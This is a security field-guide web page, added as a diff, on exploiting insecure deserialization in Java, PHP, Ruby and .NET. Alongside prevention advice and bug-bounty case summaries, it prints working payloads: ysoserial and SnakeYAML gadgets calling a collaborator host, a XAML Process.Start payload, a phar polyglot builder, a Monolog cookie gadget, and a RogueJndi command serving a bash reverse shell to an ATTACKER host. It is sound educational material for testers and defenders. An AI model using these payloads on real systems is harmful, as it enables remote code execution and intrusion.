@@ -1,0 +1,1164 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Insecure Deserialization · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Insecure Deserialization</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="on" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>Insecure Deserialization</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>69</b></span><a class="chip lab" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Insecure deserialization</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Deserialization turns bytes back into live objects. When the bytes are attacker-controlled and the runtime is allowed to rebuild <strong>arbitrary types</strong>, the act of reconstructing the object graph runs code: magic methods fire (<code>__wakeup</code>/<code>__destruct</code>/<code>readObject</code>/<code>__toString</code>), a <strong>gadget chain</strong> of already-loaded classes resolves, and you reach RCE before the application logic ever inspects the data. Treat it as the shortest path from "untrusted string" to "shell as the service account" — usually <strong>unauthenticated</strong>, and usually against a managed product carrying a public CVE.</p>
+<p>The whole game is <strong>the sink and the classpath</strong>. A serialized blob is inert until something calls <code>readObject</code>/<code>unserialize</code>/<code>Marshal.load</code>/<code>pickle.loads</code> on it, and even then RCE needs a usable gadget in the libraries already loaded. So the job splits cleanly: find the sink that deserializes untrusted input, fingerprint what gadgets are reachable, then deliver a blob for a chain that target actually supports. Two flavours: <strong>native serializers</strong> (Java <code>readObject</code>, PHP <code>unserialize</code>, Ruby <code>Marshal</code>, Python <code>pickle</code>, .NET <code>BinaryFormatter</code>) that rebuild any type by design, and <strong>polymorphic type binding</strong> (SnakeYAML <code>!!javaClass</code>, Jackson/<code>TypeNameHandling</code>, ColdFusion <code>_metadata.classname</code>) where the <em>caller</em> names the class to instantiate.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Fingerprint the framework/version first.</strong> Most of this class is <em>known-CVE-against-old-software</em> — footer banners, stack traces, login-page release strings, <code>Server</code> headers. Version disclosure is half the exploit.</li><li><strong>Spot the format on the wire.</strong> Base64/hex blobs in cookies, hidden fields, or POST bodies; the tells below identify the runtime at a glance.</li><li><strong>Locate the sink.</strong> A parameter/cookie/header/upload that ends up in <code>readObject</code>/<code>unserialize</code>/<code>Marshal.load</code>/<code>YAML.load</code>/<code>pickle.loads</code>, or a filesystem call reachable with a user path (<code>phar://</code>).</li><li><strong>Prove it deserializes, not merely fetches</strong> — the differential canary (send a plain host, then the <em>same host wrapped in a serialized object</em>; only the wrapped one should ping back).</li><li><strong>Enumerate gadgets</strong> for the reachable classpath; pick a chain the target supports (don't invent one).</li><li><strong>Deliver the impact blob</strong> — RCE gadget, or a file-read/file-delete POP chain when no OS-command gadget exists.</li></ol>
+<div class="pre" data-lang=""># Format tells — identify the runtime before you build anything
+rO0AB...          -&gt; Java (base64 of 0xAC 0xED, ObjectStream)
+AC ED 00 05       -&gt; Java (raw hex header)
+a:1:{  /  O:8:"   -&gt; PHP serialize()
+--- !ruby/object  -&gt; Ruby YAML   |   \x04\b -&gt; Ruby Marshal
+application/x-amf  -&gt; Java AMF (BlazeDS)
+gASV / (dp0 / c__  -&gt; Python pickle</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>A serialized blob doing an outbound request is <strong>not</strong> proof of deserialization — many endpoints just fetch a URL. Only the differential test (host inside a serialized object) rules out a naive URL-fetch false positive (#728614).</div></div>
+<h2 class="sec" id="deserialization-sinks-by-runtime"><span class="tick">§</span>Deserialization sinks by runtime</h2>
+<p>Find which runtime and sink you're facing, then use the matching primitive.</p>
+<h3 class="sub" id="java-readobject-gadget-chains">Java <code>readObject</code> — gadget chains</h3>
+<p>Untrusted <code>ObjectInputStream.readObject</code>. Confirm blindly with a DNS/RMI pingback, then fire a gadget for a library on the classpath (Commons-Collections, Spring, etc.). Common sinks: <code>/messagebroker/amf</code> (BlazeDS AMF), JBoss <code>JMXInvokerServlet</code>/<code>web-console</code>, WebLogic <code>wls-wsat</code> XMLDecoder, Liferay <code>/api/jsonws/invoke</code>, file-based Tomcat sessions.</p>
+<div class="pre" data-lang="bash"># 1. Blind confirm — a gadget-free DNS canary (no classpath assumptions)
+ysoserial URLDNS 'http://COLLAB' | base64 -w0
+# 2. RCE once a lib is known present.
+#    Runtime.exec has NO shell, so pipes/backticks/redirects need an explicit
+#    bash wrapper; {a,b} brace-expansion beats the whitespace tokenizer.
+ysoserial CommonsCollections7 'bash -c {curl,http://COLLAB/}' | base64 -w0
+# then POST the blob to the sink (Content-Type per endpoint: x-amf, xml, form...)</div>
+<h3 class="sub" id="json-yaml-polymorphic-typing-caller-picks-the-class">JSON/YAML polymorphic typing — caller picks the class</h3>
+<p>The endpoint lets you name the type to instantiate (Liferay JSONWS, Jackson <code>TypeNameHandling</code>, SnakeYAML). No memory-corruption needed — you supply a class that reaches code on construction, and often the OS command is read from a header so you re-fire without rebuilding.</p>
+<div class="pre" data-lang="http">POST /api/jsonws/invoke HTTP/1.1
+Host: TARGET
+cmd2: id
+Content-Type: application/x-www-form-urlencoded
+
+cmd={"/expandocolumn/add-column":{}}&amp;p_auth=TOKEN&amp;tableId=1&amp;name=A&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:&lt;hex ScriptEngine gadget reading cmd2&gt;;"}</div>
+<div class="pre" data-lang="yaml"># SnakeYAML: !!javaClass instantiates arbitrary types -&gt; ScriptEngineManager/URLClassLoader RCE
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://COLLAB/"]]]]</div>
+<h3 class="sub" id="ruby-marshal-yaml-leaked-or-static-secret">Ruby Marshal / YAML — leaked or static secret</h3>
+<p>Rails <code>CookieStore</code> marshals the session server-side; forge a cookie signed with a leaked/static <code>secret_key_base</code> and it deserializes a Ruby gadget on load. Also: <code>YAML.load</code> on config/archive metadata, and <strong>client-side</strong> <code>Marshal.load</code> of a fetched response.</p>
+<div class="pre" data-lang="ruby"># CookieStore RCE once you own the secret (git-scanned or shipped-static, e.g. GHE &lt;2.8.7)
+use exploit/multi/http/rails_secret_deserialization
+set secret &lt;leaked_secret_key_base&gt;
+set railsversion 4
+set targeturi /auth/facebook
+exploit</div>
+<h3 class="sub" id="php-unserialize-phar-pop-chains">PHP <code>unserialize</code> / <code>phar://</code> — POP chains</h3>
+<p>Any <code>unserialize()</code> on a cookie/import blob is object injection: instantiate a class whose <code>__wakeup</code>/<code>__destruct</code>/<code>__toString</code> starts a <strong>POP chain</strong>. Even without <code>unserialize()</code>, any filesystem function (<code>fopen</code>/<code>is_dir</code>/<code>file_exists</code>/<code>getimagesize</code>) reached with a user-controlled path deserializes a <code>phar://</code> archive's metadata.</p>
+<div class="pre" data-lang="php">// Plant a phar polyglot, then point ANY filesystem call at it. Magic bytes ignore .png.
+$p = new Phar('exploit.phar'); $p-&gt;startBuffering();
+$p-&gt;setStub('&lt;?php __HALT_COMPILER();');
+$p-&gt;setMetadata(new \Vendor\GadgetClass);   // a class with a useful __destruct/__wakeup
+$p-&gt;addFromString('a.txt','x'); $p-&gt;stopBuffering();
+rename('exploit.phar','exploit.png');        // defeats image-only upload filters
+// trigger: file=phar:///var/www/uploads/exploit.png</div>
+<div class="pre" data-lang="php">// Cookie object injection — the sink is unserialize($_COOKIE[...]); use phpggc for the chain
+O:6:"Canary":1:{s:3:"url";s:19:"http://COLLAB/probe";}</div>
+<h3 class="sub" id="net-xmlserializer-xaml-dnn-cookie">.NET — XmlSerializer / XAML / DNN cookie</h3>
+<p><code>XmlSerializer</code>/<code>LosFormatter</code>/<code>BinaryFormatter</code>, XAML <code>ObjectDataProvider</code> (SharePoint), the <code>DNNPersonalization</code> cookie, Telerik <code>RadAsyncUpload</code>. XAML needs no ysoserial blob — pure data-binding reaches <code>Process.Start</code>.</p>
+<div class="pre" data-lang="xml">&lt;!-- XAML ObjectDataProvider -&gt; Process.Start, no gadget lib required --&gt;
+&lt;ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+    xmlns:System="clr-namespace:System;assembly=mscorlib"
+    xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"
+    x:Key="x" ObjectType="{x:Type Diag:Process}" MethodName="Start"&gt;
+  &lt;ObjectDataProvider.MethodParameters&gt;
+    &lt;System:String&gt;cmd.exe&lt;/System:String&gt;
+    &lt;System:String&gt;/c ping COLLAB&lt;/System:String&gt;
+  &lt;/ObjectDataProvider.MethodParameters&gt;
+&lt;/ObjectDataProvider&gt;</div>
+<h3 class="sub" id="jndi-log4shell-outbound-lookup-deserialization">JNDI / Log4Shell — outbound-lookup deserialization</h3>
+<p>A config string that accepts a JAAS <code>LoginModule</code>, or any value logged by a vulnerable Log4j, forces the server to reach out over LDAP/RMI and deserialize the attacker's response.</p>
+<div class="pre" data-lang=""># Kafka Connect / Debezium connector property -&gt; outbound LDAP -&gt; gadget RCE
+database.history.producer.sasl.jaas.config = com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://ATTACKER" useFirstPass="true" serviceName="x" group.provider.url="x";
+# serve the gadget:  java -jar RogueJndi.jar --hostname ATTACKER -c "bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER/4445 0&gt;&amp;1'"</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Fingerprint URLs worth probing directly: <code>GET /messagebroker/amf</code> (BlazeDS), <code>GET /Telerik.Web.UI.WebResource.axd?type=rau</code> ("handler is registered successfully"), <code>GET /api/jsonws/invoke</code> (Liferay), <code>POST /wls-wsat/CoordinatorPortType</code> (WebLogic). A hit at an old version is a deserialization CVE waiting to fire.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Image-only upload filter</td><td>phar magic bytes ignore extension; rename <code>.phar</code> → <code>.jpg</code>/<code>.png</code></td><td>#403083, #921288</td></tr><tr><td>Proxy blocks the internal path</td><td>prepend the <code>%5C../</code> traversal token to <em>every</em> request to keep the bypass</td><td>#502758</td></tr><tr><td>Commons-Collections deser disabled</td><td><code>System.setProperty</code> gadget re-enables it before firing CC7</td><td>#1529790</td></tr><tr><td><code>safe_load</code> monkey-patch</td><td>reach a <em>different</em>, unpatched <code>YAML.load</code> (<code>read_checksums</code>), pivot to <code>Marshal</code></td><td>#274990</td></tr><tr><td>No secret to steal</td><td>shipped-<strong>static</strong> <code>secret_key_base</code> in unpatched GHE <code>&lt;2.8.7</code></td><td>#206227</td></tr><tr><td>Exploit path mismatch</td><td>server appended <code>.tmp</code> to the upload; patch the deserialized path to match</td><td>#838196</td></tr><tr><td>Metasploit cookie regex too strict</td><td>patch regex to allow <code>-</code> in the session cookie name</td><td>#134321</td></tr><tr><td>Rebuild per command</td><td>gadget reads the OS command from a request header (<code>cmd2</code>), re-fire freely</td><td>#2742457</td></tr><tr><td><code>array_merge</code> type error at sink</td><td>wrap the injected object in an array so the sink merges cleanly</td><td>#415137</td></tr><tr><td>Type-restricted <code>unserialize</code></td><td>native-extension type confusion (GMP <code>__wakeup</code> → object-store overwrite → template <code>eval</code>)</td><td>#198734</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>Never fire an untested <code>CommonsCollections</code>/<code>ysoserial</code> payload that spawns a shell against production without a safe proof first. Use a <code>URLDNS</code>/<code>Sleep()</code> gadget (a ~10 s response delay, or a blind DNS/RMI pingback) to prove execution — then report. Spraying RCE gadgets can corrupt state or crash the service.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Deserialization is the <strong>terminal</strong> of most chains — it lands RCE — so the interesting escalation is what <em>feeds</em> it:</p>
+<ul><li><strong>LFI/LFR → source disclosure → object injection → RCE.</strong> Reading source turns blind injection into a targeted gadget hunt: find an <code>unserialize()</code> sink and a class whose <code>__toString</code> runs <code>loadXML</code> → XXE → SSRF to an internal Python service that unpickles → RCE (#415501, #415137).</li><li><strong>File upload → deserialization.</strong> phar polyglot upload then a filesystem-function trigger (#403083); Telerik weak-key upload then <code>JavaScriptSerializer</code> (#838196); Tomcat partial-PUT planting a session file (#3031518). See <a href="#">file-upload</a>.</li><li><strong>Recon → leaked/static secret → forged blob.</strong> GitHub-scanned or shipped-static <code>secret_key_base</code> → forged <code>CookieStore</code> cookie → Marshal RCE (#134321, #206227).</li><li><strong>No-RCE gadget available?</strong> Still high-impact: arbitrary <strong>file read</strong> (ColdFusion <code>_metadata.classname</code> traversal #2248781), arbitrary <strong>file delete</strong> (<code>VolatileDirectory::__destruct</code> → <code>unlink</code> #921288), or a <strong>memory-corruption</strong> primitive in a native handler (#198734).</li><li><strong>Reverse/client-side deserialization.</strong> A malicious <em>server</em> attacks the <em>client</em> that <code>Marshal.load</code>s/<code>pickle.load</code>s its response — CI and dev machines running <code>bundle install</code> are the victims (#1119120). See <a href="#">ssrf</a> and <a href="#">xxe</a> for the pivots.</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Don't deserialize untrusted input.</strong> Prefer JSON/protobuf with a fixed schema over native serializers. If you must accept objects, enforce a strict <strong>type allowlist</strong> (<code>ObjectInputFilter</code>, <code>Psych.safe_load</code>, <code>JsonSerializer</code> <em>without</em> <code>TypeNameHandling</code>, <code>SafeConstructor</code> for YAML).</li><li><strong>Partial hardening is a trap.</strong> One <code>safe_load</code> doesn't protect a second, forgotten <code>YAML.load</code>/<code>Marshal.load</code> on the same object — audit <em>every</em> deserialization entry point, including secondary files inside an archive (#274990).</li><li><strong>Patch/version the product.</strong> Most cases are stale GHE/Liferay/SharePoint/WebLogic/Telerik with a public CVE; a patched version is non-exploitable even with a valid-looking blob. When triaging a report, a patched version = likely non-exploitable.</li><li><strong>Kill <code>phar://</code> deserialization</strong> (<code>phar.readonly=1</code>, keep user paths out of filesystem functions), and don't expose a write-enabled default servlet alongside file-based session persistence (#3031518).</li><li><strong>Rotate and secret-manage</strong> <code>secret_key_base</code>/machine keys; never ship them static or commit them (#206227, #134321).</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>ysoserial / ysoserial.net</strong> — Java/.NET gadget-chain generation (<code>URLDNS</code> for blind confirm, <code>CommonsCollections*</code>/<code>Sleep</code> for proof).</li><li><strong>phpggc</strong> — PHP <code>unserialize</code>/phar POP-chain library.</li><li><strong>jexboss</strong> — JBoss <code>JMXInvoker</code>/<code>web-console</code>/invoker deserialization (#502758).</li><li><strong>RogueJndi / marshalsec</strong> — serve LDAP/RMI gadgets for JNDI pivots (#1529790).</li><li><strong>Metasploit <code>rails_secret_deserialization</code></strong> — Rails CookieStore RCE from a known secret (#206227, #134321).</li><li><strong>RAU_crypto.py + CVE-2019-18935.py</strong> — Telerik <code>RadAsyncUpload</code> version-brute and deserialization (#838196).</li><li><strong>Gitrob / trufflehog</strong> — scan an org's public repos for <code>secret_key_base</code>/machine keys (#134321).</li><li><strong>Burp Collaborator</strong> — blind DNS/RMI/HTTP pingbacks for the differential canary.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>69</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-502758" style="--sv:var(--sev-crit)" data-sev="4" data-votes="571" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CVE chain: proxy traversal -&gt; unauth JBoss console -&gt; Java deserialization RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#502758</b> · starbucks · awarded · 571 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span><span>Chain <b>Recon/version disclosure -&gt; CVE-2007-0450 proxy traversal</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An obsolete custom CMS fronted an old Tomcat/JBoss; a mod_proxy directory-traversal (CVE-2007-0450) let the reverse proxy be bypassed to reach an unauthenticated JBoss web console (CVE-2007-1036), then exploited for Java deserialization RCE.</p>
+<h4>Method</h4><ol><li>Fingerprint obscure/old stack from footer, stack traces, version banners</li><li>Trigger Tomcat mod_proxy traversal to bypass the internal proxy: request /josso/%5C../</li><li>Reach the internal-only JBoss web-console that has no auth</li><li>Use jexboss against the invoker/deserialization, routing every request through the traversal prefix</li></ol>
+<div class="pre">GET /josso/%5C../web-console/ HTTP/1.1
+# then jexboss against /josso/%5C../ prefix for the deserialization RCE</div>
+<p class="insight"><b>Insight —</b> A dead 404/redirect page is not the end - fingerprint the CMS/app-server version and chain known-CVE traversals to reach internal-only admin consoles. When a proxy blocks a path, prepend the traversal token to every request to keep the bypass.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/502758" target="_blank" rel="noopener">hackerone.com/reports/502758</a></span><a class="src" href="#report-502758" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-206227" style="--sv:var(--sev-crit)" data-sev="4" data-votes="119" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GitHub Enterprise Rails hardcoded secret_key_base -&gt; cookie deserialization RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#206227</b> · imgur · awarded · 119 votes · resolved</div>
+<div class="taxo"><span>Program <b>imgur</b></span><span>Surface <b>web</b></span><span>Chain <b>Version fingerprint -&gt; known static secret_key_base -&gt;</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unpatched GitHub Enterprise (&lt;2.8.7) shipped a static Rails secret_key_base; knowing it lets an attacker forge a CookieStore session cookie containing a marshalled Ruby object that executes on server-side deserialization.</p>
+<h4>Method</h4><ol><li>Fingerprint GHE version (login page / release notes) and confirm it predates the 2.8.7 patch</li><li>Use the public static secret to sign a malicious Rails session cookie (marshalled RCE gadget)</li><li>Send it to trigger server-side unmarshal -&gt; RCE</li></ol>
+<div class="pre"># Rails signed CookieStore RCE using the leaked/static secret_key_base
+# (metasploit multi/http/rails_secret_deserialization or manual Marshal gadget)</div>
+<p class="insight"><b>Insight —</b> Unpatched appliances often carry known static secrets - always version-fingerprint managed products (GHE, GitLab, Confluence) and check for public secret-key/CVE disclosures. A static Rails secret = trivial CookieStore deserialization RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/206227" target="_blank" rel="noopener">hackerone.com/reports/206227</a></span><a class="src" href="#report-206227" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/deserialization" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-2248328" style="--sv:var(--sev-crit)" data-sev="4" data-votes="82" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>PHP unserialize() of a cookie with a Monolog gadget chain</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#2248328</b> · nextcloud · none · 82 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Custom WP theme calls unserialize(base64_decode($_COOKIE['nc_form_fields'])) on attacker-controlled cookie data; a Monolog FingersCrossedHandler-&gt;SyslogHandler-style gadget present via the PodLove plugin turns object injection into system() command execution.</p>
+<h4>Method</h4><ol><li>Identify a request path that hits the vulnerable filter (e.g. the newsletter page rendering NinjaForms fields).</li><li>Build a serialized Monolog FingersCrossedHandler gadget whose buffered record + processors reach call_user_func('system', 'id').</li><li>base64-encode it and set it as the nc_form_fields cookie; the response body contains the command output.</li></ol>
+<div class="pre">curl -s -H 'Host: nextcloud.com' \
+  -b 'nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7...czoic3lzdGVtIjt9fQ==' \
+  'https://TARGET/newsletter/'
+# decoded gadget: O:37:"Monolog\Handler\FingersCrossedHandler":4:{...buffer=[['id','level'=&gt;100]]...processors=[1=&gt;'system']}</div>
+<p class="insight"><b>Insight —</b> Grep the codebase for unserialize()/unserialize on $_COOKIE/$_GET/$_POST; if any dependency (Monolog, Guzzle, Laravel, Symfony) is autoloaded, PHPGGC has a ready gadget. Cookies are a favored injection point because they ride every request.</p>
